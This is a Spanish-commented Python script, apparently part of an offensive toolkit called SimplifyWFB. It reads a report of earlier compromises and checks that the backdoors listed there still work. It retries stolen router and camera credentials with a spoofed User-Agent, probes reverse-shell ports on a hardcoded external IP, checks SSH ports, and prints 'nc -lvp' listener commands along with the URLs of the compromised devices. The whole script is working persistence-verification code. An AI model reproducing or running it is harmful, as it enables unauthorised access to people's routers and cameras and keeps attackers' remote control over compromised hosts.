#!/usr/bin/env python3
"""
Test Rápido de Backdoors - SimplifyWFB
Script optimizado para probar rápidamente los backdoors más importantes
"""

import json
import socket
import time
import sys
import os
from typing import Dict, List, Any

class QuickBackdoorTester:
    def __init__(self, report_file: str = "report.json"):
        """Inicializar el tester rápido"""
        self.report_file = report_file
        self.report_data = None
        self.results = {
            'router_access': [],
            'reverse_shells': [],
            'camera_access': [],
            'summary': {
                'total_tested': 0,
                'successful': 0,
                'failed': 0
            }
        }
        
    def load_report(self) -> bool:
        """Cargar el reporte JSON"""
        try:
            if not os.path.exists(self.report_file):
                print(f"❌ Archivo de reporte no encontrado: {self.report_file}")
                return False
                
            with open(self.report_file, 'r', encoding='utf-8') as f:
                self.report_data = json.load(f)
                
            print(f"✅ Reporte cargado: {self.report_file}")
            return True
            
        except Exception as e:
            print(f"❌ Error cargando reporte: {e}")
            return False
    
    def test_port_open(self, host: str, port: int, timeout: int = 2) -> bool:
        """Probar si un puerto está abierto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def test_http_access(self, host: str, port: int, username: str, password: str) -> bool:
        """Probar acceso HTTP básico"""
        try:
            import urllib.request
            import base64
            
            auth_string = f"{username}:{password}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            url = f"http://{host}:{port}/"
            req = urllib.request.Request(url)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            with urllib.request.urlopen(req, timeout=3) as response:
                return response.status == 200
                
        except:
            return False
    
    def test_router_access(self):
        """Probar acceso al router"""
        print("\n🌐 PROBANDO ACCESO AL ROUTER")
        print("-" * 40)
        
        router_access = self.report_data.get('phase_4_persistence', {}).get('router_access', [])
        
        for router in router_access:
            gateway = router['gateway']
            credentials = router['credentials']
            
            print(f"🔍 Router: {gateway}")
            print(f"   Credenciales: {credentials['username']}:{credentials['password']}")
            
            # Probar puerto 80 (HTTP)
            if self.test_port_open(gateway, 80):
                print(f"   ✅ Puerto 80 abierto")
                
                # Probar acceso HTTP
                if self.test_http_access(gateway, 80, credentials['username'], credentials['password']):
                    print(f"   ✅ Acceso HTTP exitoso")
                    self.results['router_access'].append({
                        'gateway': gateway,
                        'status': 'success',
                        'method': 'http_web_interface'
                    })
                    self.results['summary']['successful'] += 1
                else:
                    print(f"   ❌ Acceso HTTP falló")
                    self.results['router_access'].append({
                        'gateway': gateway,
                        'status': 'failed',
                        'method': 'http_web_interface'
                    })
                    self.results['summary']['failed'] += 1
            else:
                print(f"   ❌ Puerto 80 cerrado")
                self.results['router_access'].append({
                    'gateway': gateway,
                    'status': 'failed',
                    'method': 'http_web_interface'
                })
                self.results['summary']['failed'] += 1
            
            self.results['summary']['total_tested'] += 1
    
    def test_reverse_shells(self):
        """Probar reverse shells"""
        print("\n🔄 PROBANDO REVERSE SHELLS")
        print("-" * 40)
        
        network_persistence = self.report_data.get('phase_4_persistence', {}).get('network_persistence', [])
        reverse_shells = [service for service in network_persistence if service.get('service') == 'reverse_shell']
        
        # Obtener IP externa del reporte
        external_ip = self.report_data.get('metadata', {}).get('external_ip', '212.95.62.135')
        
        for reverse_shell in reverse_shells:
            port = reverse_shell['port']
            print(f"🔍 Reverse Shell puerto {port}")
            print(f"   IP externa: {external_ip}")
            print(f"   Comando: {reverse_shell.get('reverse_command', 'N/A')}")
            
            # Probar conectividad al puerto
            if self.test_port_open(external_ip, port):
                print(f"   ✅ Puerto {port} accesible")
                self.results['reverse_shells'].append({
                    'port': port,
                    'external_ip': external_ip,
                    'status': 'success',
                    'type': 'reverse_shell'
                })
                self.results['summary']['successful'] += 1
            else:
                print(f"   ❌ Puerto {port} no accesible")
                self.results['reverse_shells'].append({
                    'port': port,
                    'external_ip': external_ip,
                    'status': 'failed',
                    'type': 'reverse_shell'
                })
                self.results['summary']['failed'] += 1
            
            self.results['summary']['total_tested'] += 1
    
    def test_camera_access(self):
        """Probar acceso a cámaras"""
        print("\n📹 PROBANDO ACCESO A CÁMARAS")
        print("-" * 40)
        
        cameras_accessed = self.report_data.get('phase_4_persistence', {}).get('cameras_accessed', [])
        
        for camera in cameras_accessed:
            host = camera['host']
            port = camera['port']
            credentials = camera['credentials']
            camera_type = camera['camera_type']
            
            print(f"🔍 Cámara: {camera_type} en {host}:{port}")
            print(f"   Credenciales: {credentials['username']}:{credentials['password']}")
            
            # Probar puerto
            if self.test_port_open(host, port):
                print(f"   ✅ Puerto {port} abierto")
                
                # Probar acceso HTTP
                if self.test_http_access(host, port, credentials['username'], credentials['password']):
                    print(f"   ✅ Acceso a cámara exitoso")
                    self.results['camera_access'].append({
                        'host': host,
                        'port': port,
                        'camera_type': camera_type,
                        'status': 'success',
                        'method': 'http_web_interface'
                    })
                    self.results['summary']['successful'] += 1
                else:
                    print(f"   ❌ Acceso a cámara falló")
                    self.results['camera_access'].append({
                        'host': host,
                        'port': port,
                        'camera_type': camera_type,
                        'status': 'failed',
                        'method': 'http_web_interface'
                    })
                    self.results['summary']['failed'] += 1
            else:
                print(f"   ❌ Puerto {port} cerrado")
                self.results['camera_access'].append({
                    'host': host,
                    'port': port,
                    'camera_type': camera_type,
                    'status': 'failed',
                    'method': 'http_web_interface'
                })
                self.results['summary']['failed'] += 1
            
            self.results['summary']['total_tested'] += 1
    
    def test_ssh_connections(self):
        """Probar conexiones SSH"""
        print("\n🔐 PROBANDO CONEXIONES SSH")
        print("-" * 40)
        
        remote_connections = self.report_data.get('phase_4_persistence', {}).get('remote_connections', [])
        ssh_connections = [conn for conn in remote_connections if conn.get('type') == 'ssh']
        
        for conn in ssh_connections:
            host = conn['host']
            port = conn['port']
            username = conn['username']
            
            print(f"🔍 SSH: {username}@{host}:{port}")
            
            # Solo probar conectividad del puerto
            if self.test_port_open(host, port):
                print(f"   ✅ Puerto {port} abierto")
                self.results['summary']['successful'] += 1
            else:
                print(f"   ❌ Puerto {port} cerrado")
                self.results['summary']['failed'] += 1
            
            self.results['summary']['total_tested'] += 1
    
    def run_quick_tests(self):
        """Ejecutar pruebas rápidas"""
        if not self.report_data:
            print("❌ No hay datos de reporte cargados")
            return
            
        print("🚀 INICIANDO PRUEBAS RÁPIDAS DE BACKDOORS")
        print("=" * 50)
        
        # Ejecutar pruebas
        self.test_router_access()
        self.test_reverse_shells()
        self.test_camera_access()
        self.test_ssh_connections()
    
    def show_summary(self):
        """Mostrar resumen"""
        print("\n" + "=" * 50)
        print("📊 RESUMEN DE PRUEBAS RÁPIDAS")
        print("=" * 50)
        
        summary = self.results['summary']
        print(f"🔍 Total probado: {summary['total_tested']}")
        print(f"✅ Exitosos: {summary['successful']}")
        print(f"❌ Fallidos: {summary['failed']}")
        
        if summary['total_tested'] > 0:
            success_rate = (summary['successful'] / summary['total_tested']) * 100
            print(f"📈 Tasa de éxito: {success_rate:.1f}%")
        
        # Mostrar detalles por categoría
        if self.results['router_access']:
            successful_routers = len([r for r in self.results['router_access'] if r['status'] == 'success'])
            print(f"\n🌐 Routers accesibles: {successful_routers}/{len(self.results['router_access'])}")
        
        if self.results['reverse_shells']:
            successful_shells = len([r for r in self.results['reverse_shells'] if r['status'] == 'success'])
            print(f"🔄 Reverse shells activos: {successful_shells}/{len(self.results['reverse_shells'])}")
        
        if self.results['camera_access']:
            successful_cameras = len([r for r in self.results['camera_access'] if r['status'] == 'success'])
            print(f"📹 Cámaras accesibles: {successful_cameras}/{len(self.results['camera_access'])}")
        
        # Mostrar comandos de acceso
        print(f"\n🔧 COMANDOS DE ACCESO:")
        print("-" * 30)
        
        # Router access
        for router in self.results['router_access']:
            if router['status'] == 'success':
                print(f"🌐 Router {router['gateway']}: http://{router['gateway']}:80/")
        
        # Reverse shells
        for shell in self.results['reverse_shells']:
            if shell['status'] == 'success':
                print(f"🔄 Reverse shell puerto {shell['port']}: nc -lvp {shell['port']}")
        
        # Cameras
        for camera in self.results['camera_access']:
            if camera['status'] == 'success':
                print(f"📹 Cámara {camera['host']}: http://{camera['host']}:{camera['port']}/")

def main():
    """Función principal"""
    print("⚡ SimplifyWFB - Test Rápido de Backdoors")
    print("=" * 50)
    
    # Verificar argumentos
    report_file = "report.json"
    if len(sys.argv) > 1:
        report_file = sys.argv[1]
    
    # Crear tester
    tester = QuickBackdoorTester(report_file)
    
    # Cargar reporte
    if not tester.load_report():
        return
    
    # Ejecutar pruebas rápidas
    tester.run_quick_tests()
    
    # Mostrar resumen
    tester.show_summary()

if __name__ == "__main__":
    main()